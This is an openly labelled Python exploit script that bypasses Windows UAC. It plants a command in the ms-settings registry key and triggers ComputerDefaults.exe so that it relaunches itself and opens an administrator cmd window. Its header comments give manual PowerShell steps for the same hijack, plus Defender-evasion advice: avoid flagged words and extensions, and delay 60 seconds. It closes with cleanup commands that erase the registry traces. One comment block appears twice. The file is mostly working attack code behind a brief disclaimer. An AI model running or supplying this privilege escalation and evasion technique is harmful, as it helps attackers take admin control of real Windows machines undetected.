import os
import sys
import time
import subprocess
import winreg
from ctypes import windll


# ######################################################################################################################################################################################################
# ##################################################################################### Exploit by raphaelthief ########################################################################################
# ######################################################################################################################################################################################################

# ######################################################################################################################################################################################################
# Disclaimer :
# I am obviously not responsible for what you might do with this technique, and I encourage you to not misuse this code, of course
# However, many exploits sold on various forums use the ComputerDefaults vulnerability. Perhaps one day we will get a fix for these vulnerabilities, but for now, it seems like it’s just a temporary patch ?
# But of course, I don't have all the details regarding the proposed fix
# ######################################################################################################################################################################################################

# ######################################################################################################################################################################################################
# To bypass Windows Defender on the UAC via a registry key, you need to ensure several points :
# - The path must not contain any suspicious words or extensions related to the system
# --> 'ComputerDefaults', 'bypass' are suspicious words flagged by Windows Defender, leading to an immediate detection
# --> '.py', 'cmd', '.vbs', '.ps1', '.bat' are system extensions that are part of the blacklist implemented by Microsoft for this vulnerability
# - The launch of the exploit must be accompanied by a delay of at least 60 seconds. Below that, Defender will consider this behavior a threat
# ######################################################################################################################################################################################################

# ######################################################################################################################################################################################################
# To bypass Windows Defender on the UAC via a registry key, you need to ensure several points :
# - The path must not contain any suspicious words or extensions related to the system
# --> 'ComputerDefaults', 'bypass' are suspicious words flagged by Windows Defender, leading to an immediate detection
# --> '.py', 'cmd', '.vbs', '.ps1', '.bat' are system extensions that are part of the blacklist implemented by Microsoft for this vulnerability
# - The launch of the exploit must be accompanied by a delay of at least 60 seconds. Below that, Defender will consider this behavior a threat
# ######################################################################################################################################################################################################

# ######################################################################################################################################################################################################
# You can manually reproduce this process :
# - Create an executable according to your needs (launch an application, run a cmd, etc...)
# - Enter the following commands one by one :
# --> New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;
# --> New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;
# --> Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'FILE_TO_TRIGGER' -Force;
# - Replace FILE_TO_TRIGGER with your executable
# - Ensure the path and executable name are 'non-suspicious' as mentioned earlier
# - Wait at least 60 seconds
# - Open a cmd without administrative rights and then enter the command 'ComputerDefaults'
# - Your executable should launch with administrative rights
# - Delete the exploit with the following command :
# --> Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force
# ######################################################################################################################################################################################################


# Checks if the registry key exists. If it exists, the program will launch a cmd window with admin rights
def check_registry_key_exists(key_path):
    try:
        registry = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.CloseKey(registry)
        return True  # The key exists
    except FileNotFoundError:
        return False  # The key does not exist

# Creates a registry entry for UAC bypass via the ComputerDefaults exploit
def set_bypass():
    print("[+] Creating registry entry...")

    # Path of the current executable. This entry allows launching a cmd window with admin rights by relaunching the current program with elevated privileges
    current_file_path = sys.argv[0] # The path must not contain "sensitive" words like 'ComputerDefaults', 'bypass', 'cmd', '.py', '.vbs', '.bat', etc. Such words are flagged automatically

    reg_add = (
        f"New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
        f"New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
        f"Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value '{current_file_path}' -Force;"
    )

    command = f"powershell -Command \"{reg_add}\""
    result = subprocess.run(command, shell=True)
    
    if result.returncode != 0:
        print("[-] Error while creating registry entry.")
    else:
        print("[+] Registry entry created successfully.")

    print("[+] Bypassing Windows Defender...")
    print("[+] Sleeping 60 seconds...")
    time.sleep(60)  # Wait for 60 seconds. This delay helps bypass Windows Defender

    print("[+] Launching admin CMD...")
    
    if windll.shell32.ShellExecuteW(None, "open", r"C:\Windows\System32\ComputerDefaults.exe", None, None, 0) <= 32: # Launch the ComputerDefaults.exe to trigger the UAC prompt
        print("[-] Error while running ComputerDefaults.")

    time.sleep(10)  # Wait for 10 seconds. Depending on system performance, this delay gives enough time to relaunch the program and trigger an admin cmd window

    print("[+] Clearing registry entry...")
    reg_kill = "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force" # Deletes the registry entries created for the exploit
    command = f"powershell -Command \"{reg_kill}\""
    result = subprocess.run(command, shell=True)

    if result.returncode != 0:
        print("[-] Error while clearing registry entry.")
    else:
        print("[+] Registry entry cleared successfully.")

    print("[+] Done.")

# Launches the UAC bypass
def uac_bypass():
    print("[+] Launching cmd with admin rights...")
    subprocess.run("start cmd", shell=True)
    sys.exit(0)  # Close the exploit

def main():
    key_path = r"Software\Classes\ms-settings\Shell\Open\command"  # Path of the registry key to be created for exploiting the ComputerDefaults vulnerability

    if check_registry_key_exists(key_path):  # Check if the registry key exists
        uac_bypass()  # If it exists, launch a cmd window because the current program has already been relaunched with admin rights
    else:
        set_bypass()  # The registry key does not exist, so create it with the current program's path to relaunch it with admin rights

if __name__ == "__main__":
    main()